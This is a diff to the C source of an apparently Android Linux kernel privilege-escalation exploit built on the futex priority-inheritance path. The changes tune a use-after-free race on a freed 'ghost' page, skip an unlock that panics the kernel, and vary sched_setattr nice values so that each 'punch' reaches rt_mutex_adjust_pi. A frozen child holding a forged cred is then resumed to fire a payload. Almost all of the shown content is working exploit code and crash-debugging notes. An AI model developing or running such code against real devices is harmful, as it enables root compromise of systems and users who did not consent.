@@ -268,8 +268,15 @@ void *waiter_thread(void *arg __attribute__((unused))) {
      * survived 30min with this). Then the real route runs with the waiter
      * blocked IN select for the consumer's controlled punch (roll 14's
      * proven full cycle).
+     *
+     * MODE4_JC2_LATE_MIDSTAMP=1 moves this pair INTO the route function,
+     * immediately before the blocking select (after all prints/fsyncs/fd
+     * opens): the ghost's freelist window shrinks from the whole route
+     * setup to microseconds. Early copy skipped here to avoid a second
+     * freelist exposure.
      */
-    if (env_flag("MODE4_JC2_MIDSTAMP_UNLOCK", 0)) {
+    if (env_flag("MODE4_JC2_MIDSTAMP_UNLOCK", 0) &&
+        !env_flag("MODE4_JC2_LATE_MIDSTAMP", 0)) {
       fd_set in2, out2, ex2;
       prepare_pselect_fdsets(&in2, &out2, &ex2);
       struct timeval tv0 = {0, 0};
@@ -286,6 +293,20 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   do_pselect_fake_lock_route();
   durable_stage("waiter_pselect_returned");
   atomic_store(&route_done, 1);
+  if (quiet_entry) {
+    /*
+     * Same rule as the selfstamp early-return above: NO tail unlock. The
+     * blocking select's return already kfree'd the ghost page back onto
+     * the freelist (the route's cfi probing then ran for seconds on top
+     * of it), so this FUTEX_UNLOCK_PI's deboost walk reads freelist
+     * residue / thief data → panic. jc4 fire 09-20: walk + punch + cfi
+     * stage ALL landed, boot died exactly here. NO owner_chain_done wait
+     * either: main exiting the process kills every thread (the blocked
+     * owner included — futex exit cleanup releases it) and the dangling
+     * dies with the waiter task.
+     */
+    return NULL;
+  }
   futex_op(f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
   return NULL;
@@ -354,7 +375,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
       } else {
         for (int g = 0; g < 64 && !window_ok; g++) {
           int conf = 0;
-          for (int c = 0; c < 3; c++) {
+          int need = env_int_range("PSELECT_WCHAN_CONFIRM", 3, 1, 3);
+          for (int c = 0; c < need; c++) {
             char path[96], buf[160];
             snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
             int fd = open(path, O_RDONLY);
@@ -374,7 +396,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
             if (strncmp(buf, "do_select", 9) != 0) break;
             conf++;
           }
-          if (conf == 3) {
+          if (conf == need) {
             long long started = g_select_start_us;
             if (started > 0) {
               struct timespec gnow;
@@ -403,6 +425,15 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         if (env_flag("MODE4_CFI_ON_PUNCH", 0) || env_flag("MODE4_PROOF", 0))
           durable_proof_log("pre_setattr");
         long sched_ret;
+        /* PSELECT_NICE_STAIRS: every burst iteration sets a DIFFERENT
+         * nice — a repeated identical setattr hits the kernel's
+         * no-change shortcut, which returns 0 without ever reaching the
+         * rt_mutex_adjust_pi tail call (the PI walk that delivers our
+         * erase-write). Stairing nice guarantees each punch is a real
+         * parameter change while the waiter stays PI-blocked. */
+        int punch_nice = consumer_nice;
+        if (env_flag("PSELECT_NICE_STAIRS", 0))
+          punch_nice = consumer_nice - burst;
         if (env_flag("PUNCH_ALL_TIDS", 0)) {
           /* The EDEADLK can leave the dangling on ANY task of the process
            * (QEMU lldb-proven: a clone held it while the waiter's own field
@@ -422,7 +453,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
                   int t2 = atoi(de->d_name);
                   if (t2 > 0 && t2 != (int)syscall(SYS_gettid)) {
                     errno = 0;
-                    sched_ret |= sched_setattr_tid(t2, consumer_nice);
+                    sched_ret |= sched_setattr_tid(t2, punch_nice);
                   }
                 }
                 dp += de->d_reclen;
@@ -430,10 +461,10 @@ void *consumer_thread(void *arg __attribute__((unused))) {
             }
             close(df);
           } else {
-            sched_ret = sched_setattr_tid(tid, consumer_nice);
+            sched_ret = sched_setattr_tid(tid, punch_nice);
           }
         } else {
-          sched_ret = sched_setattr_tid(tid, consumer_nice);
+          sched_ret = sched_setattr_tid(tid, punch_nice);
         }
         pr_info("consumer punch tid=%d sched_ret=%ld errno=%d\n", tid,
                 sched_ret, errno);
@@ -3973,10 +4004,15 @@ int run_exploit(int argc, char **argv) {
     durable_stage("route_threads_returned");
     /* KIMI SIGCONT: resume the frozen child — cred is now consistent
      * (both pointers = same fake cred). The child's next poll will read
-     * its own CapEff and fire the payload on landing. */
-    if (g_cap_child_pid > 0) {
+     * its own CapEff and fire the payload on landing.
+     * MODE4_CAPS_NOCONT=1 (jc4/5/6 split test): leave the child frozen —
+     * boot survives → killer is the child's resume path (cred content);
+     * boot still dies → killer is the teardown (waiter/owner exit). */
+    if (g_cap_child_pid > 0 && !env_flag("MODE4_CAPS_NOCONT", 0)) {
       kill(g_cap_child_pid, SIGCONT);
       pr_info("CAPSONLY: child SIGCONT (cred consistent, resume polling)\n");
+    } else if (g_cap_child_pid > 0) {
+      pr_info("CAPS_NOCONT: child left FROZEN (split test)\n");
     }
   { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
     if(tf>=0){write(tf,"MAIN_AFTER_THREADS'+BS+'n",18);close(tf);} }
